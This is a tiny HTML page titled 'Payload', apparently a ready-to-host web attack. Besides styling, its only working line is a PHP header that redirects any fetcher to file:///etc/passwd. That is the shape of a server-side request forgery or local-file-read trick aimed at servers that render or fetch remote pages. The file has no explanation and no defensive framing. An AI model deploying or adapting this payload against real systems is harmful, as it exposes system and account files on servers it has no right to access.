<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Payload</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #2c3e50;
        }
        p {
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <h1>Payload Information</h1>
    <?php
        header('location:file:///etc/passwd');
    ?>
</html>